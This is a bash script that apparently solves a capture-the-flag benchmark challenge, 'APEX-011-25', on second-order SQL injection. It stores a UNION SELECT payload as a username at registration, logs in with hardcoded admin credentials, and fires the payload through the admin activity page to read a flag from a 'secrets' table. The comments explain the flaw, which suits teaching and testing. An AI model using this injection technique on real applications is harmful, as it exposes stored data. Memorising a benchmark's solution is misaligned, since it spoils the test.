#!/usr/bin/env bash
# APEX-011-25 — "Second-Order SQL Injection" (tags: sqli, stored)
#
# Registration is written correctly: the username goes into a prepared
# statement and nothing about it can change that INSERT. The admin panel is
# where it goes wrong. `activity.php` looks the username up with a prepared
# statement, decides that a value which came back out of the database is
# therefore safe, and concatenates it into the next query.
#
# So the injection is stored on one request and executed on another, by a
# different user, in a different part of the application. `activity_logs` has
# seven columns, and the third is the one the page prints.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex011-$$"
PAYLOAD="' UNION SELECT 1,2,flag,4,5,6,7 FROM secrets-- "
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/register.php" --session "$SESSION" --new --capture >/dev/null

# Stored, safely, by a query that could not be injected.
send "$SESSION" req_0 --create \
    --set method=POST --set path=/register.php \
    --set header.Content-Type=application/x-www-form-urlencoded \
    --set "form.username=$PAYLOAD" \
    --set "form.email=second-order-$$@example.test" \
    --set form.password=password123 \
    --set form.confirm_password=password123 >/dev/null

# The admin is the one who sets it off, so the session has to be the admin's.
send "$SESSION" req_0 --create \
    --set method=POST --set path=/login.php \
    --set header.Content-Type=application/x-www-form-urlencoded \
    --set form.username=admin --set form.password=admin123 >/dev/null

send "$SESSION" req_0 --create \
    --set path=/admin/activity.php --set "query.user=$PAYLOAD" | flag
